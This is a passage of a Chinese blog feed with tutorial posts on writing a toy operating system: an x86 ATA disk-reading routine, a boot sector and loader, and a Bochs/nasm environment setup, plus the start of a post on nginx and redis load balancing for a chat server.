class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">; 函数参数</span><br><span class="line">; edi 将磁盘内容读到哪里</span><br><span class="line">; ecx 从磁盘哪一个扇区开始 </span><br><span class="line">; bl 要读多少个扇区</span><br><span class="line">read_disk:</span><br><span class="line">    ; 设置读写扇区的数量</span><br><span class="line">    ; 0x1f2 是硬盘控制端口，表示读写扇区的数量</span><br><span class="line">    mov dx, 0x1f2</span><br><span class="line">    mov al, bl</span><br><span class="line">    ; 写端口用OUT指令 将al的值写入到dx端口</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    inc dx; 0x1f3 起始扇区前8位端口</span><br><span class="line">    ; 因为ecx为起始扇区 </span><br><span class="line">    ; ecx中的cl就是0-7位</span><br><span class="line">    mov al, cl; 起始扇区前8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    inc dx; 0x1f4 起始扇区中8位端口</span><br><span class="line">    shr ecx, 8 ;右移8位</span><br><span class="line">    mov al, cl; 起始扇区中8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    inc dx; 0x1f5 起始扇区高8位端口</span><br><span class="line">    shr ecx, 8 ;右移8位</span><br><span class="line">    mov al, cl; 起始扇区高8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    inc dx ;0x1f6</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    and cl, 0b1111 ;将高4位置为0，对应起始扇区的24-27位</span><br><span class="line">    mov al,0b1110_0000 ;第4位为0，表示主盘，第6位为1，表示LBA，5-7位必须为1</span><br><span class="line">    ; 将al和cl合二为一，放在al中</span><br><span class="line">    or al, cl</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    inc dx ;0x1f7</span><br><span class="line">    mov al, 0x20 ;表示读硬盘</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx ;清空ecx</span><br><span class="line">    mov cl, bl ;得到写扇区的数量</span><br><span class="line"></span><br><span class="line">    ; loop指令会检查ecx是否为0 cl在ecx里面</span><br><span class="line">    .read:</span><br><span class="line">        push cx ;保存下，因为函数里面使用了</span><br><span class="line">        call .waits ;等待数据准备完毕</span><br><span class="line">        call .reads ;读取一个扇区</span><br><span class="line">        pop cx ;恢复</span><br><span class="line">        loop .read</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">    .waits:</span><br><span class="line">        mov dx, 0x1f7 ;读0x1f7端口</span><br><span class="line">        .check:</span><br><span class="line">            in al, dx ;将dx端口的值放入al中</span><br><span class="line">            jmp $+2 ;直接跳转到下一行 其实什么都没做，就是为了延迟一下</span><br><span class="line">            jmp $+2</span><br><span class="line">            jmp $+2</span><br><span class="line"></span><br><span class="line">            and al, 0b1000_1000 ;获得al的第3位和第7位</span><br><span class="line">            cmp al, 0b0000_1000 ;测试是否第7位为0，第3位为1 硬盘不繁忙，数据准备完毕</span><br><span class="line">            jnz .check ;数据没准备好</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    .reads:</span><br><span class="line">        mov dx, 0x1f0 ;用于读写数据</span><br><span class="line">        mov cx, 256 ;一个扇区256字节</span><br><span class="line">        ; loop指定会检查ecx cx在ecx里面</span><br><span class="line">        .readw:</span><br><span class="line">            in ax, dx</span><br><span class="line">            jmp $+2 ;直接跳转到下一行 其实什么都没做，就是为了延迟一下</span><br><span class="line">            jmp $+2</span><br><span class="line">            jmp $+2</span><br><span class="line"></span><br><span class="line">            ; edi表示读取的目标内存</span><br><span class="line">            mov [edi], ax</span><br><span class="line">            ; 因为ax是16bit，2个字节，所以edi+2</span><br><span class="line">            add edi, 2</span><br><span class="line">            loop .readw</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure><p>下面是磁盘的相关端口</p><table><thead><tr><th>Primary 通道</th><th>Secondary 通道</th><th>in 操作</th><th>out 操作</th></tr></thead><tbody><tr><td>0x1F0</td><td>0x170</td><td>Data</td><td>Data</td></tr><tr><td>0x1F1</td><td>0x171</td><td>Error</td><td>Features</td></tr><tr><td>0x1F2</td><td>0x172</td><td>Sector count</td><td>Sector count</td></tr><tr><td>0x1F3</td><td>0x173</td><td>LBA low</td><td>LBA low</td></tr><tr><td>0x1F4</td><td>0x174</td><td>LBA mid</td><td>LBA mid</td></tr><tr><td>0x1F5</td><td>0x175</td><td>LBA high</td><td>LBA high</td></tr><tr><td>0x1F6</td><td>0x176</td><td>Device</td><td>Device</td></tr><tr><td>0x1F7</td><td>0x177</td><td>Status</td><td>Command</td></tr></tbody></table><ul><li>0x1F0：16bit 端口，用于读写数据</li><li>0x1F1：检测前一个指令的错误</li><li>0x1F2：读写扇区的数量</li><li>0x1F3：起始扇区的 0 ~ 7 位</li><li>0x1F4：起始扇区的 8 ~ 15 位</li><li>0x1F5：起始扇区的 16 ~ 23 位</li><li>0x1F6:<ul><li>0 ~ 3：起始扇区的 24 ~ 27 位</li><li>4: 0 主盘, 1 从片</li><li>6: 0 CHS, 1 LBA</li><li>5 ~ 7：固定为1</li></ul></li><li>0x1F7: out<ul><li>0xEC: 识别硬盘</li><li>0x20: 读硬盘</li><li>0x30: 写硬盘</li></ul></li><li>0x1F7: in &#x2F; 8bit<ul><li>0 ERR</li><li>3 DRQ 数据准备完毕</li><li>7 BSY 硬盘繁忙</li></ul></li></ul><blockquote><p>注意上面的out和in指令</p><p>读端口用IN指令，写端口用OUT指令</p><p>out a，b 将b的值写入到a端口</p><p>in   a，b 将b端口的值读到a中</p></blockquote><p>先来看4个起始扇区的寄存器 ：<code>0x1F3</code>、<code>0x1F4</code>、<code>0x1F5</code>、<code>0x1F6</code>，假如此时的起始扇区<code>ecx=123456789</code> ,即32位bit为<code>00000111010110111100110100010101</code></p><ul><li><p>0-7位：<code>00010101</code> &#x3D;&gt; <code>0x1F3</code></p></li><li><p>8-15位：<code>11001101</code> &#x3D;&gt; <code>0x1F4</code></p></li><li><p>16-23位：<code>01011011</code> &#x3D;&gt; <code>0x1F5</code></p></li><li><p>24-31位：<code>00000111</code></p><ul><li>24-27位：<code>0111</code> &#x3D;&gt; <code>0x1F6</code>(0-3)</li><li><code>mov al,0b1110_0000</code><ul><li><code>0</code> &#x3D;&gt; <code>0x1F6</code>(4) 表示主盘</li><li><code>111</code> &#x3D;&gt; <code>ox1F6</code>(5-7) 固定为</li></ul></li></ul></li></ul><p>再来看<code>0x1F7</code>，值为<code>0x20</code>，表示读磁盘</p><p>然后通过<code>mov cl,bl</code>，将扇区数量放在<code>cl</code>中，后面进行循环，汇编中循环的次数和<code>ecx</code>有关。因为是要读磁盘，因此需要先等待磁盘数据处理好，然后才进行读取，<code>.wait</code>便是这个作用，其余的相关解析可以通过代码注释看懂，这里就不赘述了</p><blockquote><p>jmp $+2</p><p>可以通过反汇编看到</p><p>0000:jmp $+2<br>0002:xxx</p><p>所以这行代码就是跳到下一行，起到等待的作用</p></blockquote><p>经过编写这个函数，我们就可以从磁盘中得到我们想要的代码啦，前面说过，我们本身就想将<code>loader.asm</code>代码放在磁盘的一个地方，然后再读进来，那怎么放呢，这样，我们先简单写一个<code>loader.asm</code></p><h1 id="loader-asm"><a href="#loader-asm" class="headerlink" title="loader.asm"></a><code>loader.asm</code></h1><p>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[org 0x1000]</span><br><span class="line"></span><br><span class="line">; 打印字符串</span><br><span class="line">mov si, loading</span><br><span class="line">call print</span><br><span class="line"></span><br><span class="line">; 阻塞</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">print:</span><br><span class="line">    mov ah, 0x0e</span><br><span class="line">.next:</span><br><span class="line">    mov al, [si]</span><br><span class="line">    cmp al, 0</span><br><span class="line">    jz .done</span><br><span class="line">    int 0x10</span><br><span class="line">    inc si</span><br><span class="line">    jmp .next</span><br><span class="line">.done:</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">loading:</span><br><span class="line">    db &quot;Loading System...&quot;, 10, 13, 0; \n\r</span><br></pre></td></tr></table></figure><p>同样的，我们只是打印出一句话即可，那我们怎么将这些代码复制到磁盘中去呢，下面两行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f bin loader.bin loader.asm</span><br><span class="line">dd if=loader.bin of=master.img bs=512 count=4 seek=2 conv=notrunc</span><br></pre></td></tr></table></figure><p>利用dd命令，将bin文件从偏移为2的地方，写入4个到master.img中，这样就可以知道<code>loader.bin</code>在磁盘哪里，就可以读入了</p><p><code>boot.asm</code>中代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; 因为loader.bin是从第2个扇区开始写入，写了4个扇区</span><br><span class="line">mov edi, 0x1000;读取的目标内存</span><br><span class="line">mov ecx, 2 ;起始扇区</span><br><span class="line">mov bl, 4 ;扇区数量</span><br><span class="line">call read_disk</span><br></pre></td></tr></table></figure><p>经过上面一番折腾，终于从<code>boot</code>跳转到<code>loader</code>中了，后续我们将对<code>loader.asm</code>进行完善，实现<code>loader</code>所需要的功能，下次见啦。。。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这一次我们进入操作系统实现的真实编码， 这一次主要是完善对boot.asm文件的全部实现，开始吧。。。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://www.shicoder.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>操作系统实现-简单热身</title>
    <link href="http://www.shicoder.top/posts/2733103160.html"/>
    <id>http://www.shicoder.top/posts/2733103160.html</id>
    <published>2022-04-24T12:07:35.000Z</published>
    <updated>2022-05-06T11:03:01.398Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>这次对上次的boot.asm进行代码讲解，也可以对汇编的相关理论进行补充</p><span id="more"></span><h1 id="boot-asm"><a href="#boot-asm" class="headerlink" title="boot.asm"></a><code>boot.asm</code></h1><p>主引导扇区位于硬盘的0柱面0磁头1扇区处，首先BIOS加电后，就会将主引导程序加载进来，然后执行</p><p>我们先看下boot.asm中有啥把</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[org 0x7c00]</span><br><span class="line"></span><br><span class="line">; 设置屏幕模式为文本模式，清除屏幕</span><br><span class="line">mov ax, 3</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">; 初始化段寄存器</span><br><span class="line">mov ax, 0</span><br><span class="line">mov ds, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov sp, 0x7c00</span><br><span class="line"></span><br><span class="line">; 0xb8000 文本显示器的内存区域</span><br><span class="line">mov ax, 0xb800</span><br><span class="line">mov ds, ax</span><br><span class="line">mov byte [0], &#x27;H&#x27;</span><br><span class="line"></span><br><span class="line">; 阻塞</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">; 填充 0</span><br><span class="line">times 510 - ($ - $$) db 0</span><br><span class="line"></span><br><span class="line">; 主引导扇区的最后两个字节必须是 0x55 0xaa</span><br><span class="line">; dw 0xaa55</span><br><span class="line">db 0x55, 0xaa</span><br></pre></td></tr></table></figure><ul><li>0x7c00</li></ul><p>因为bios在上电之后，会去将boot主引导程序加载到0x7c00，然后利用一个跳转，跳到0x7c00处执行，因此我们需要将boot.asm代码放在0x7c00处，org便是这个功能</p><ul><li>设置屏幕为文本模式</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 3</span><br><span class="line">int 0x10</span><br></pre></td></tr></table></figure><p>int 0x10为bios中断服务，给定不同的ax，会进行不同的调用程序，下表给出ax&#x3D;3时候的程序</p><table><thead><tr><th>AL</th><th>文字&#x2F;图形</th><th>分表率</th><th>颜色</th></tr></thead><tbody><tr><td>00</td><td>文字</td><td>40*25</td><td>2</td></tr><tr><td>01</td><td>文字</td><td>40*25</td><td>16</td></tr><tr><td>02</td><td>文字</td><td>80*25</td><td>2</td></tr><tr><td>03</td><td>文字</td><td>80*25</td><td>16</td></tr><tr><td>04</td><td>图形</td><td>320*320</td><td>2</td></tr><tr><td>05</td><td>图形</td><td>320*320</td><td>4</td></tr><tr><td>06</td><td>图形</td><td>640*200</td><td>2</td></tr></tbody></table><ul><li>初始化段寄存器</li></ul><p>因为不能使用<code>mov ds,0</code>这种，因此借助<code>ax</code>进行初始化</p><ul><li>显示文本</li></ul><p>由于BIOS加载之后，还是实模式，为了在这个模式下显示文本，我们需要知道要在哪个内存区域进行显示，下面给出实模式下的内存区域</p><table><thead><tr><th>起始地址</th><th>结束地址</th><th>大小</th><th>用途</th></tr></thead><tbody><tr><td><code>0x000</code></td><td><code>0x3FF</code></td><td>1KB</td><td>中断向量表</td></tr><tr><td><code>0x400</code></td><td><code>0x4FF</code></td><td>256B</td><td>BIOS 数据区</td></tr><tr><td><code>0x500</code></td><td><code>0x7BFF</code></td><td>29.75 KB</td><td>可用区域</td></tr><tr><td><code>0x7C00</code></td><td><code>0x7DFF</code></td><td>512B</td><td>MBR 加载区域</td></tr><tr><td><code>0x7E00</code></td><td><code>0x9FBFF</code></td><td>607.6KB</td><td>可用区域</td></tr><tr><td><code>0x9FC00</code></td><td><code>0x9FFFF</code></td><td>1KB</td><td>扩展 BIOS 数据区</td></tr><tr><td><code>0xA0000</code></td><td><code>0xAFFFF</code></td><td>64KB</td><td>用于彩色显示适配器</td></tr><tr><td><code>0xB0000</code></td><td><code>0xB7FFF</code></td><td>32KB</td><td>用于黑白显示适配器</td></tr><tr><td><code>0xB8000</code></td><td><code>0xBFFFF</code></td><td>32KB</td><td>用于文本显示适配器</td></tr><tr><td><code>0xC0000</code></td><td><code>0xC7FFF</code></td><td>32KB</td><td>显示适配器 BIOS</td></tr><tr><td><code>0xC8000</code></td><td><code>0xEFFFF</code></td><td>160KB</td><td>映射内存</td></tr><tr><td><code>0xF0000</code></td><td><code>0xFFFEF</code></td><td>64KB-16B</td><td>系统 BIOS</td></tr><tr><td><code>0xFFFF0</code></td><td><code>0xFFFFF</code></td><td>16B</td><td>系统 BIOS 入口地址</td></tr></tbody></table><p>可以看出在0xb8000处可以显示文本，因此</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 0xb800</span><br><span class="line">mov ds, ax</span><br><span class="line">mov byte [0], &#x27;H&#x27;</span><br><span class="line">相当于是 move byte ds:[0], &#x27;H&#x27;</span><br><span class="line">实模式下寻址方式为</span><br><span class="line">( 16 位段基址 &lt;&lt; 4 ) + 16 位偏移地址</span><br><span class="line">ds &lt;&lt; 4 + 0 = 0xb8000</span><br></pre></td></tr></table></figure><ul><li>0x55aa</li></ul><p>若一段程序结束的魔数为0x55aa，BIOS才会认为是合格的主引导程序</p><blockquote><p>注意，在汇编代码中，若定义一个数字 ，左边是高位</p><p>比如  dw 0xaa55，则编译之后，aa在高位</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这次对上次的boot.asm进行代码讲解，也可以对汇编的相关理论进行补充&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://www.shicoder.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>操作系统实现-开发环境配置</title>
    <link href="http://www.shicoder.top/posts/543605244.html"/>
    <id>http://www.shicoder.top/posts/543605244.html</id>
    <published>2022-04-24T10:55:13.000Z</published>
    <updated>2022-04-26T09:15:38.248Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>这一次我们开始自己实现一个简单的操作系统，当然自己也是在看别人的视频进行学习，希望自己能从这个实验中学习到操作系统相关的知识</p><span id="more"></span><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul><li>VMware</li><li>ArchLinux</li><li>VSCode</li><li>nasm</li><li>bochs</li><li>qemu</li><li>gdb</li></ul><h1 id="VSCode远程连接"><a href="#VSCode远程连接" class="headerlink" title="VSCode远程连接"></a>VSCode远程连接</h1><p>这个步骤就大家自行百度下把</p><h1 id="boot-asm"><a href="#boot-asm" class="headerlink" title="boot.asm"></a>boot.asm</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[org 0x7c00]</span><br><span class="line"></span><br><span class="line">; 设置屏幕模式为文本模式，清除屏幕</span><br><span class="line">mov ax, 3</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">; 初始化段寄存器</span><br><span class="line">mov ax, 0</span><br><span class="line">mov ds, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov sp, 0x7c00</span><br><span class="line"></span><br><span class="line">; 0xb8000 文本显示器的内存区域</span><br><span class="line">mov ax, 0xb800</span><br><span class="line">mov ds, ax</span><br><span class="line">mov byte [0], &#x27;H&#x27;</span><br><span class="line"></span><br><span class="line">; 阻塞</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">; 填充 0</span><br><span class="line">times 510 - ($ - $$) db 0</span><br><span class="line"></span><br><span class="line">; 主引导扇区的最后两个字节必须是 0x55 0xaa</span><br><span class="line">; dw 0xaa55</span><br><span class="line">db 0x55, 0xaa</span><br></pre></td></tr></table></figure><ul><li>编译</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f bin boot.asm boot.bin</span><br></pre></td></tr></table></figure><ul><li>创建硬盘镜像</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bximage -q -hd=16 -func=create -sectsize=512 -imgmode=flat master.img</span><br></pre></td></tr></table></figure><ul><li>配置bochsrc</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">configuration file generated by Bochs</span></span><br><span class="line">plugin_ctrl: unmapped=true, biosdev=true, speaker=true, extfpuirq=true, parallel=true, serial=true, iodebug=true, pcidev=false, usb_uhci=false</span><br><span class="line">config_interface: textconfig</span><br><span class="line">display_library: x,options=&quot;gui_debug&quot;</span><br><span class="line">memory: host=32, guest=32</span><br><span class="line">romimage: file=&quot;/usr/share/bochs/BIOS-bochs-latest&quot;, address=0x00000000, options=none</span><br><span class="line">vgaromimage: file=&quot;/usr/share/bochs/VGABIOS-lgpl-latest&quot;</span><br><span class="line">boot: disk</span><br><span class="line">floppy_bootsig_check: disabled=0</span><br><span class="line">floppya: type=1_44</span><br><span class="line"><span class="meta"># </span><span class="language-bash">no floppyb</span></span><br><span class="line">ata0: enabled=true, ioaddr1=0x1f0, ioaddr2=0x3f0, irq=14</span><br><span class="line">ata0-master: type=disk, path=&quot;../build/master.img&quot;, mode=flat</span><br><span class="line">ata0-slave: type=none</span><br><span class="line">ata1: enabled=true, ioaddr1=0x170, ioaddr2=0x370, irq=15</span><br><span class="line">ata1-master: type=none</span><br><span class="line">ata1-slave: type=none</span><br><span class="line">ata2: enabled=false</span><br><span class="line">ata3: enabled=false</span><br><span class="line">optromimage1: file=none</span><br><span class="line">optromimage2: file=none</span><br><span class="line">optromimage3: file=none</span><br><span class="line">optromimage4: file=none</span><br><span class="line">optramimage1: file=none</span><br><span class="line">optramimage2: file=none</span><br><span class="line">optramimage3: file=none</span><br><span class="line">optramimage4: file=none</span><br><span class="line">pci: enabled=1, chipset=i440fx, slot1=none, slot2=none, slot3=none, slot4=none, slot5=none</span><br><span class="line">vga: extension=vbe, update_freq=5, realtime=1, ddc=builtin</span><br><span class="line">cpu: count=1:1:1, ips=4000000, quantum=16, model=bx_generic, reset_on_triple_fault=1, cpuid_limit_winnt=0, ignore_bad_msrs=1, mwait_is_nop=0</span><br><span class="line">cpuid: level=6, stepping=3, model=3, family=6, vendor_string=&quot;AuthenticAMD&quot;, brand_string=&quot;AMD Athlon(tm) processor&quot;</span><br><span class="line">cpuid: mmx=true, apic=xapic, simd=sse2, sse4a=false, misaligned_sse=false, sep=true</span><br><span class="line">cpuid: movbe=false, adx=false, aes=false, sha=false, xsave=false, xsaveopt=false, avx_f16c=false</span><br><span class="line">cpuid: avx_fma=false, bmi=0, xop=false, fma4=false, tbm=false, x86_64=true, 1g_pages=false</span><br><span class="line">cpuid: pcid=false, fsgsbase=false, smep=false, smap=false, mwait=true</span><br><span class="line">print_timestamps: enabled=0</span><br><span class="line">debugger_log: -</span><br><span class="line">magic_break: enabled=1</span><br><span class="line">port_e9_hack: enabled=0</span><br><span class="line">private_colormap: enabled=0</span><br><span class="line">clock: sync=none, time0=local, rtc_sync=0</span><br><span class="line"><span class="meta"># </span><span class="language-bash">no cmosimage</span></span><br><span class="line">log: -</span><br><span class="line">logprefix: %t%e%d</span><br><span class="line">debug: action=ignore</span><br><span class="line">info: action=report</span><br><span class="line">error: action=report</span><br><span class="line">panic: action=ask</span><br><span class="line">keyboard: type=mf, serial_delay=250, paste_delay=100000, user_shortcut=none</span><br><span class="line">mouse: type=ps2, enabled=false, toggle=ctrl+mbutton</span><br><span class="line">speaker: enabled=true, mode=system</span><br><span class="line">parport1: enabled=true, file=none</span><br><span class="line">parport2: enabled=false</span><br><span class="line">com1: enabled=true, mode=null</span><br><span class="line">com2: enabled=false</span><br><span class="line">com3: enabled=false</span><br><span class="line">com4: enabled=false</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>将boot.bin写入到主引导扇区</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=boot.bin of=master.img bs=512 count=1 conv=notrunc</span><br></pre></td></tr></table></figure><h1 id="bochs中运行"><a href="#bochs中运行" class="headerlink" title="bochs中运行"></a>bochs中运行</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bochs -q -f bochsrc</span><br></pre></td></tr></table></figure><p>若bochs中显示出一个<code>H</code>，则表明配置环境成功，下一节，我们将对刚刚那个<code>boot.asm</code>进行代码讲解</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这一次我们开始自己实现一个简单的操作系统，当然自己也是在看别人的视频进行学习，希望自己能从这个实验中学习到操作系统相关的知识&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://www.shicoder.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>集群聊天服务器六</title>
    <link href="http://www.shicoder.top/posts/2449255119.html"/>
    <id>http://www.shicoder.top/posts/2449255119.html</id>
    <published>2022-04-21T02:55:55.000Z</published>
    <updated>2022-04-26T09:16:06.734Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>对于前面单台服务器而言，几千的客户端压力基本没有什么影响，但当客户端达到上万的时候，就可能会遇到一些问题，因此我准备采用<code>nginx+redis</code>的方式进行负载均衡，主要思路如下：</p><span id="more"></span><ol><li>利用<code>nginx</code>作为中转服务器，开启<code>8000</code>端口</li><li>本地<code>ip</code>开启2个端口<code>6000</code>以及<code>6002</code>，相当于可以同时开启2台服务器</li><li>客户端连接<code>8000</code>端口，<code>nginx</code>会按照配置的服务器权重将连接分发到不同服务器上</li><li>利用<code>redis</code>的订阅-发布命令来作为聊天信息中转站</li></ol><blockquote><p>例如用户1向用户2发送消息，当用户1所在服务器查询到用户2在该服务器上未登录的时候，并不是直接将信息存入离线表中，而是先去数据库查询用户2是否在线，若在线则表明用户2在其他服务器上登录，于是利用<code>redis</code>作为信息中转站，服务器将信息发给<code>redis</code>，<code>redis</code>将信息再发送给用户2</p></blockquote><h1 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">nginx 